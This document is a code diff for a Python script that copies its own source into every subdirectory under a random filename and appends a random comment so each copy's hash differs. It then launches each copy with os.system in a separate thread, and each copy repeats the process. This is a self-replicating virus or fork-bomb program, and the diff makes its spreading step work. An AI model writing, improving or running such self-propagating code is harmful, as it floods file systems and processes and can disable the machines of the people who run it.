@@ -16,6 +16,7 @@ import sys
 import random
 import string
 
+
 def writeIntoFile(file, lines):
     count = len(lines)
     start = 0
@@ -25,6 +26,7 @@ def writeIntoFile(file, lines):
         if start == (count - 1):
             break
         file.write(line)
+
 
 def previousFolder(file, lines):
     count = len(lines)
@@ -40,30 +42,34 @@ def previousFolder(file, lines):
                 print("this is where it is")
                 file.write("\nos.chdir('../')\n")
 
+
 def runFunc(dir, filename):
     os.chdir(dir)
+    g = open(".\\" + filename, "w")
+    writeIntoFile(g, lines)
+    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
+    g.close()
     os.system('python3 .\\' + filename)
 
-#get the current file
+
+# get the current file
 thisfile = os.path.basename(__file__)
 
 directory = os.getcwd()
 
-
-
 print(thisfile)
 
-#open up the file and read it
+# open up the file and read it
 f = open(thisfile, "r")
 lines = f.readlines()
 f.close()
 
-#Create the new file and include a different name
-filename = "newpython{randomness}.py".format(randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
+# Create the new file and include a different name
+filename = "newpython{randomness}.py".format(
+    randomness="".join(random.choices(string.ascii_lowercase + string.digits, k=5)))
 
-
-#start copying the contents of the files to the new one
-#try:
+# start copying the contents of the files to the new one
+# try:
 #    h = open("..\\" + filename, "w")
 #    previousFolder(h, lines)
 #    h.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
@@ -72,26 +78,13 @@ filename = "newpython{randomness}.py".format(randomness="".join(random.choices(s
 #        thread = Thread(target=runFunc("..\\" + filename))
 #        thread.start()
 
-#except:
+# except:
 #    pass
 
 
-    
-    
 for x in os.walk(directory):
-    print(x[0])
-    g = open(x[0] + "\\" + filename, "w")
-    writeIntoFile(g, lines)
-    g.write('\n#{chaos}'.format(chaos="".join(random.choices(string.ascii_lowercase + string.digits, k=5))))
-    g.close()
-    
-
-for x in os.walk(directory):
-    thread = Thread(target=runFunc(dir, filename))
+    thread = Thread(target=runFunc(x[0], filename))
     thread.start()
-    
 
-
-
-#Ensure this thread gets closed
+# Ensure this thread gets closed
 sys.exit()
